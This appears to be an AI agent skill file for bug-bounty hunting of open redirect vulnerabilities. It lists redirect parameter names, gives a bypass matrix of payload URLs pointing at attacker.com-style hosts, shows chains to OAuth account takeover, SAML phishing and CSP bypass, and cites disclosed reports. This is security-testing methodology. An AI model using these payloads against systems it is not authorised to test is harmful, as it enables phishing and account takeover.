---
name: hunt-redirect
description: Open redirect — direct, header-based, JS-based, fragment-based; chain to OAuth / SSO / phishing.
keywords: [open redirect, url redirect, redirect_uri, return_to, next, callback, refresh meta]
---

# hunt-redirect

## When this skill loads

Triggers: "open redirect", "url redirect", "return_to", "next param",
"callback url", "refresh header".

## Parameter names to probe

```
url, redirect, redirect_uri, redirect_url, return, returnTo, return_url,
returnUri, next, dest, destination, continue, callback, callbackURL,
goto, target, location, succUrl, fail_url, RelayState, ReturnUrl,
forward, image_url, link, ref, referer
```

Try all of: query string, body, cookie, Referer header.

## Bypass matrix

| Filter | Bypass |
|---|---|
| Allowlist contains `example.com` substring | `https://example.com.attacker.com/`, `https://attacker.com/example.com` |
| Requires `https://` prefix | `https://attacker.com\@evil.com/`, `https:attacker.com` |
| Blocks `//` | `/\attacker.com`, `/%5cattacker.com`, `\\/attacker.com` |
| Blocks `://` | `https:%2f%2fattacker.com`, `https:/%5cattacker.com` |
| Normalizes path | `https://example.com/redirect?to=//attacker.com/`, `https://example.com/redirect?to=///attacker.com/` |
| Requires path on same host | `https://example.com/redirect?to=/login%2f..%2f..%2f@attacker.com/`, fragment trick `https://example.com#@attacker.com/` |
| Userinfo discarded | `https://attacker.com@example.com` (some) vs `https://example.com@attacker.com` (others) |
| Server-side validator vs browser parser mismatch | host=`example.com`, port=`@attacker.com`, `https://example.com:80@attacker.com/` |
| Unicode normalization | `https://exampleㅤ.com@attacker.com` (NFKC), `https://example.com/?next=https%3A%2F%2Fattacker。com` |

## Chain templates (open redirect's real value)

Open redirect alone is on most never-submit lists. It becomes
valuable when chained:

| Chain | Effect |
|---|---|
| Open redirect on app's domain + OAuth redirect_uri allow-list "*.example.com" | OAuth ATO (see `hunt-oauth`) |
| Open redirect + SAML RelayState | SAML credential phishing |
| Open redirect + SSO logout flow | Session fixation |
| Open redirect on download endpoint | Reflected file download / SmartScreen bypass |
| Open redirect inside CSP-allowed origin | CSP bypass to attacker JS |

## JS-based redirects

```js
location = decodeURI(location.hash.slice(1))
```

Hash-driven redirects: `https://app.example.com/#https://attacker.com/`.

Same with `window.open`, `history.replaceState`, `location.assign`.

## `Refresh` header / meta-refresh

```
Refresh: 0; url=https://attacker.com/
```

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/">
```

Server-side reflection into either is open redirect.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #244696 (Yelp) | OR via `/utm_redirect?next=` |
| H1 #1062228 (PayPal) | OR + OAuth chain |
| H1 #382543 | OR via `@` userinfo bypass |
| H1 #1132182 (PayPal) | OR enabling token replay |

## Never-submit fallbacks

- Open redirect alone → KILL on 90% of programs
- Open redirect to operator-controlled site that's not an attacker
  primitive → KILL

## See also

- `hunt-oauth` — most valuable chain target
- `hunt-saml` — RelayState validation
- `hunt-xss` — javascript: URI accepted by redirect = stored XSS
